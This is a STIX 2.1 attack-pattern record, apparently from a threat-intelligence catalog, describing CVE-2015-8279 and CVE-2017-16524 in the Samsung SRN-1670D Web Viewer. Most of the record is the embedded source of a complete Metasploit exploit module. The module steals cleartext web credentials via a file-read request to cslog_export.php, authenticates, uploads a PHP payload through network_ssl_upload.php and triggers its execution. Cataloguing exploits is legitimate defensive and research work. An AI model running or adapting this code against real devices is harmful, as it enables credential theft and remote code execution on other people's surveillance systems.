{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9151009f-8891-427f-8d5a-40c857cdff1e",
    "created": "2024-08-14T17:02:29.571351Z",
    "modified": "2024-08-14T17:02:29.571355Z",
    "name": "Samsung SRN-1670D Web Viewer Version 1.0.0.193 Arbitrary File Read and Upload",
    "description": " This module exploits an unrestricted file upload vulnerability in Web Viewer 1.0.0.193 on Samsung SRN-1670D devices. The network_ssl_upload.php file allows remote authenticated attackers to upload and execute arbitrary PHP code via a filename with a .php extension, which is then accessed via a direct request to the file in the upload/ directory.  To authenticate for this attack, one can obtain web-interface credentials in cleartext by leveraging the existing local file read vulnerability",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/samsung_srv_1670d_upload_exec.rb",
            "external_id": "samsung_srv_1670d_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16524"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/realistic-security/CVE-2017-16524"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-8279"
        },
        {
            "source_name": "reference",
            "url": "http://blog.emaze.net/2016/01/multiple-vulnerabilities-samsung-srn.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'digest'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samsung SRN-1670D Web Viewer Version 1.0.0.193 Arbitrary File Read and Upload',\n      'Description'    => %q{\n        This module exploits an unrestricted file upload vulnerability in\n        Web Viewer 1.0.0.193 on Samsung SRN-1670D devices. The network_ssl_upload.php file\n        allows remote authenticated attackers to upload and execute arbitrary\n        PHP code via a filename with a .php extension, which is then accessed via a\n        direct request to the file in the upload/ directory.\n\n        To authenticate for this attack, one can obtain web-interface credentials\n        in cleartext by leveraging the existing local file read vulnerability\n        referenced by CVE-2015-8279, which allows remote attackers to read the\n        web interface credentials by sending a request to:\n        cslog_export.php?path=/root/php_modules/lighttpd/sbin/userpw URI.\n      },\n      'Author'         =>\n        [\n          'Omar Mezrag <omar.mezrag@realistic-security.com>',  # @_0xFFFFFF\n          'Realistic Security',\n          'Algeria'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-16524' ],\n          [ 'URL', 'https://github.com/realistic-security/CVE-2017-16524' ],\n          [ 'CVE', '2015-8279' ],\n          [ 'URL', 'http://blog.emaze.net/2016/01/multiple-vulnerabilities-samsung-srn.html' ]\n        ],\n      'Privileged'     => true,\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          ['Samsung SRN-1670D 1.0.0.193', {}]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-03-14'\n    ))\n  end\n\n  def check\n    vprint_status('Checking version...')\n\n    resp = send_request_cgi({\n      'uri'    =>  \"/index\",\n      'method' => 'GET'\n    })\n\n    unless resp\n      vprint_error('Connection timed out.')\n      return CheckCode::Unknown\n    end\n\n    # File Version 1.0.0.193\n    version = nil\n    if resp && resp.code == 200 && resp.body.match(/Web Viewer for Samsung NVR/)\n      if resp.body =~ /File Version (\\d+\\.\\d+\\.\\d+\\.\\d+)/\n        version = $1\n        if version == '1.0.0.193'\n          vprint_good \"Found vesrion: #{version}\"\n          return CheckCode::Appears\n        end\n      end\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    print_status('Obtaining credentails...')\n\n    resp = send_request_cgi({\n      'uri'      => '/cslog_export.php',\n      'method'   => 'GET',\n      'vars_get' =>\n        {\n          'path' => '/root/php_modules/lighttpd/sbin/userpw',\n          'file' => 'foo'\n        }\n    })\n\n    unless resp\n      print_error('Connection timed out.')\n      return\n    end\n\n    if resp && resp.code == 200 && resp.body !~ /Authentication is failed/ and resp.body !~ /File not found/\n      username =  resp.body.split(':')[0]\n      password =  resp.body.split(':')[1].gsub(\"\\n\",'')\n      print_good \"Credentials obtained successfully: #{username}:#{password}\"\n\n      data1 = Rex::Text.encode_base64(\"#{username}\")\n      data2 = Digest::SHA256.hexdigest(\"#{password}\")\n\n      randfloat  = Random.new\n      data3 =  randfloat.rand(0.9)\n      data4 = data3\n\n      print_status('Logging...')\n\n      resp = send_request_cgi({\n        'uri'       => '/login',\n        'method'    => 'POST',\n        'vars_post' =>\n          {\n            'data1' => data1,\n            'data2' => data2,\n            'data3' => data3,\n            'data4' => data4\n          },\n          'headers' =>\n          {\n            'DNT' => '1',\n            'Cookie' => 'IESEVEN=1'\n          }\n      })\n\n      unless resp\n        print_error(\"Connection timed out.\")\n        return\n      end\n\n      if resp && resp.code == 200 && resp.body !~ /ID incorrecte/ && resp.body =~ /setCookie\\('NVR_DATA1/\n        print_good('Authentication Succeeded')\n\n        nvr_d1 = $1 if resp.body =~ /setCookie\\('NVR_DATA1', '(\\d\\.\\d+)'/\n        nvr_d2 = $1 if resp.body =~ /setCookie\\('NVR_DATA2', '(\\d+)'/\n        nvr_d3 = $1 if resp.body =~ /setCookie\\('NVR_DATA3', '(0x\\h\\h)'/\n        nvr_d4 = $1 if resp.body =~ /setCookie\\('NVR_DATA4', '(0x\\h\\h)'/\n        nvr_d7 = $1 if resp.body =~ /setCookie\\('NVR_DATA7', '(\\d)'/\n        nvr_d8 = $1 if resp.body =~ /setCookie\\('NVR_DATA8', '(\\d)'/\n        nvr_d9 = $1 if resp.body =~ /setCookie\\('NVR_DATA9', '(0x\\h\\h)'/\n\n        cookie = \"IESEVEN=1; NVR_DATA1=#{nvr_d1}; NVR_DATA2=#{nvr_d2}; NVR_DATA3=#{nvr_d3}; NVR_DATA4=#{nvr_d4}; NVR_DATA7=#{nvr_d7}; NVR_DATA8=#{nvr_d8}; NVR_DATA9=#{nvr_d9}\"\n\n        payload_name = \"#{rand_text_alpha(8)}.php\"\n\n        print_status(\"Generating payload[ #{payload_name} ]...\")\n\n        php_payload = get_write_exec_payload(unlink_self: true)\n\n        print_status('Uploading payload...')\n\n        data = Rex::MIME::Message.new\n        data.add_part('2', nil, nil, 'form-data; name=\"is_apply\"')\n        data.add_part('1', nil, nil, 'form-data; name=\"isInstall\"')\n        data.add_part('0', nil, nil, 'form-data; name=\"isCertFlag\"')\n        data.add_part(php_payload, 'application/x-httpd-php', nil, \"form-data; name=\\\"attachFile\\\"; filename=\\\"#{payload_name}\\\"\")\n        post_data = data.to_s\n\n        resp = send_request_cgi({\n          'uri'      => normalize_uri('/network_ssl_upload.php'),\n          'method'   => 'POST',\n          'vars_get' =>\n            {\n              'lang' => 'en'\n            },\n          'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n          'cookie'   => cookie,\n          'data'     => post_data\n        })\n\n        unless resp\n          print_error('Connection timed out.')\n          return\n        end\n\n        if resp and resp.code == 200\n          print_status('Executing payload...')\n          upload_uri = normalize_uri(\"/upload/#{payload_name}\")\n          resp = send_request_cgi({\n            'uri'    => upload_uri,\n            'method' => 'GET'\n          }, 5)\n\n          unless resp\n            print_error(\"Connection timed out.\")\n            return\n          end\n\n          if resp and resp.code != 200\n            print_error(\"Failed to upload\")\n          end\n        else\n          print_error(\"Failed to upload\")\n        end\n      else\n        print_error(\"Authentication failed\")\n      end\n    else\n      print_error \"Error obtaining credentails\"\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-03-14",
    "x_mitre_platforms": [
        "php'"
    ]
}